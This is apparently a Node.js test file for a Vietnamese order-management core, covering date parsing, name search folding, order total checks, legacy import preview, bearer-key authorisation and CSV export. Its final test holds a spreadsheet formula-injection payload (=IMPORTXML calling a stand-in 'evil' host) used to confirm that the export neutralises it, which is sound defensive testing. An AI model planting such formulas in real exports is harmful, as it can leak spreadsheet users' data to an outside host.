'use strict';
const test=require('node:test');
const assert=require('node:assert/strict');
const C=require('../src/core');

const normal={name:'Khách thử',phone:'0900123456',date:'2026-10-19',
  items:[{code:'TP-00001',product:'Nước Satori 350ml',qty:2,unitPrice:65000}],shippingAmount:10000,vatAmount:0};
test('Vietnamese dates accepted and invalid dates rejected',()=>{
  assert.equal(C.dateISO('19/10/2026'),'2026-10-19');
  assert.equal(C.dateISO('2026-10-19'),'2026-10-19');
  assert.equal(C.dateISO('31/02/2026'),null);
  assert.equal(C.dateISO('22/0802026'),null);
});
test('Vietnamese names normalize for search',()=>{
  assert.equal(C.fold('ĐẶNG  Thị  Ánh'),'dang thi anh');
  assert.equal(C.phone('0900 123 456 (Anh)'),'0900123456');
});
test('order validates financial math without silently changing user total',()=>{
  const o=C.validateOrder(normal);
  assert.equal(o.total,140000);
  assert.equal(o.status,'Chưa thanh toán');
  assert.throws(()=>C.validateOrder({...normal,total:135000}),e=>e.code==='TOTAL_MISMATCH');
  assert.equal(C.paid({...normal,status:'Đã thanh toán'}),true);
  assert.equal(C.paid({...normal,status:'Đã TT Satori'}),false);
  assert.equal(C.active({...normal,status:'Đã hủy'}),false);
});
test('legacy data passes through and is never price-recalculated',()=>{
  const o={id:1,name:'Khách cũ',date:'19/08/2026',total:3731394.6,items:null};
  assert.deepEqual(C.validateOrder(o,{legacy:true}),o);
});
test('no duplicate IDs or empty imports; preview does not mutate',()=>{
  const snapshot={values:{satori_orders_v15:JSON.stringify([{id:1,name:'A',date:'19/10/2026'},{id:2,name:'B',date:'22/0802026'}])}};
  const a=C.previewLegacy({snapshot});
  assert.equal(a.count,2);assert.equal(a.invalidDates,1);
  assert.equal(a.checksum,C.hash(snapshot));
  assert.throws(()=>C.previewLegacy({snapshot:{orders:[]}}),e=>e.code==='EMPTY_IMPORT');
  assert.throws(()=>C.previewLegacy({snapshot:{orders:[{id:1},{id:1}]}}),e=>e.code==='DUPLICATE_ID');
});
test('scoped bearer keys work only with their secret, never matching prefix',()=>{
  const secret='mSa_'+ 'a'.repeat(60);
  const keys=[{id:'bot-test',sha256:C.hash(secret),scopes:['orders:read']}];
  assert.equal(C.authorize('Bearer '+secret,keys).id,'bot-test');
  assert.throws(()=>C.authorize('Bearer '+secret.slice(0,-1)+'b',keys),e=>e.status===401);
});
test('spreadsheet export neutralizes formula cells',()=>{
  assert.equal(C.safeCSV('=IMPORTXML("https://evil","/")'),"\"'=IMPORTXML(\"\"https://evil\"\",\"\"/\"\")\"");
  assert.equal(C.safeCSV('Khách bình thường'),'"Khách bình thường"');
});
